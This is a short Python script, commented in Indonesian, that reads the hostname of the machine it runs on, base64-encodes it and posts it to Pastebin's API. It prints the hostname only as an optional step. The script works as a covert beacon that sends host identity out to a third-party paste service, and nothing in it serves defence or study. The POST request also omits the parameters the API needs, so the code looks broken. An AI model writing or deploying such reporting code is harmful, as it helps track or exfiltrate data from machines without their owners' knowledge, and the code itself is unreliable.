import socket 
import requests
import base64
    

def main():
    
    #mencari nama host
    nama_host = socket.gethostname()
    
    #di encode ke base64
    host64 = nama_host.encode('utf-8')
    encode64 = base64.b64encode(host64)
    
    #Upload ke Pastebin
    url = "http://pastebin.com/api/api_post.php"
    upload = requests.post(url, encode64)

    #print nama hostnya (opsional dan bisa dihapus)
    print(f"Host name is : {nama_host}")


if __name__ == "__main__":
    main()